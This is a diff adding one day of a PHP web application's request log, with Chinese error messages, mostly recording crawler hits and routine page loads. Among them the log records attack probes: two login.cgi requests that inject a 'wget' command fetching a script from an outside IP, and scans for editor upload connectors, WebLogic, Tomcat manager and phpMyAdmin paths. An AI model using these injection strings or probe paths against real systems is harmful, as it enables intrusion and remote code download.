@@ -1,0 +1,118 @@
+[ 2018-09-02T00:34:34+08:00 ] 203.208.60.96 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T00:34:36+08:00 ] 203.208.60.14 /Cart/ajaxFcuntion.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000245s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000466s ]
+SQL: SHOW COLUMNS FROM `plgox_specifications` [ RunTime:0.0005s ]
+SQL: SELECT * FROM plgox_specifications as sp left join plgox_zulin as zulin on zulin.zulin_id = sp.specifications_day_number_id  WHERE `specifications_id` = '24'  [ RunTime:0.0005s ]
+
+[ 2018-09-02T01:32:05+08:00 ] 125.65.112.8 /search/www.ymwears.cn
+ERR: 无法加载控制器:Search
+
+[ 2018-09-02T02:19:03+08:00 ] 171.99.157.153 /login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$
+ERR: 无法加载控制器:Login.cgi
+
+[ 2018-09-02T03:27:15+08:00 ] 203.208.60.91 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T03:27:15+08:00 ] 203.208.60.84 /Zulin/share_list?order1=10.6481027095578611
+ERR: 非法操作:share_list
+
+[ 2018-09-02T03:28:13+08:00 ] 203.208.60.114 /Zulin/share_list?order2=20.34399502584710717
+ERR: 非法操作:share_list
+
+[ 2018-09-02T03:30:17+08:00 ] 66.249.79.233 /Zulin/share_list?defaults=30.24873096914961934
+ERR: 非法操作:share_list
+
+[ 2018-09-02T03:37:24+08:00 ] 66.249.79.233 /Index/weituo.html
+ERR: 1048:Column 'weituo_uid' cannot be null
+ [ SQL语句 ] : INSERT INTO `plgox_weituo` (`weituo_uid`,`weituo_tel`,`weituo_time`) VALUES (NULL,'','1535830644')
+
+[ 2018-09-02T04:33:30+08:00 ] 137.175.11.219 /CKeditor/editor/filemanager/connectors/asp/upload.asp
+ERR: 无法加载控制器:CKeditor
+
+[ 2018-09-02T04:33:31+08:00 ] 137.175.11.219 /guanli/fckeditor/editor/filemanager/connectors/asp/upload.asp
+ERR: 无法加载控制器:Guanli
+
+[ 2018-09-02T04:33:31+08:00 ] 137.175.11.219 /news/Edit/editor/filemanager/connectors/asp/upload.asp
+ERR: 无法加载控制器:News
+
+[ 2018-09-02T04:33:32+08:00 ] 137.175.11.219 /sladmin/fckeditorsoutayals/editor/filemanager/connectors/asp/upload.asp
+ERR: 无法加载控制器:Sladmin
+
+[ 2018-09-02T05:54:25+08:00 ] 157.55.39.234 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T06:08:22+08:00 ] 157.55.39.15 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T08:04:51+08:00 ] 118.89.51.192 /wls-wsat/CoordinatorPortType
+ERR: 无法加载控制器:Wls-wsat
+
+[ 2018-09-02T10:39:38+08:00 ] 47.92.159.8 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-09-02T11:56:05+08:00 ] 118.69.37.227 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2018-09-02T15:10:13+08:00 ] 221.216.137.35 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000310s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000520s ]
+
+[ 2018-09-02T16:13:59+08:00 ] 218.30.103.3 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T16:47:15+08:00 ] 180.163.220.68 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000281s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000553s ]
+
+[ 2018-09-02T16:47:26+08:00 ] 180.163.220.96 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000288s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000554s ]
+
+[ 2018-09-02T16:47:29+08:00 ] 180.163.220.99 /Index/weizhi.html
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000285s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000506s ]
+
+[ 2018-09-02T18:48:40+08:00 ] 203.208.60.54 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T18:56:55+08:00 ] 120.92.42.78 /data/%236Ik1Qv.asa
+ERR: 无法加载控制器:Data
+
+[ 2018-09-02T18:56:55+08:00 ] 120.92.42.78 /data/%23data.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-02T18:56:55+08:00 ] 120.92.42.78 /data/%23aspcms252.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-02T18:56:55+08:00 ] 120.92.42.78 /data/%235Dp8Gh.asp
+ERR: 无法加载控制器:Data
+
+[ 2018-09-02T18:56:55+08:00 ] 120.92.42.78 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2018-09-02T19:30:42+08:00 ] 193.112.40.132 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2018-09-02T20:21:49+08:00 ] 203.208.60.49 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T21:43:19+08:00 ] 157.55.39.15 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T22:05:01+08:00 ] 213.180.203.57 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T22:35:46+08:00 ] 220.181.125.177 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-09-02T23:09:23+08:00 ] 190.94.149.42 /login.cgi?cli=aa%20aa%27;wget%20http://128.199.251.119/t.php%27$
+ERR: 无法加载控制器:Login.cgi
+
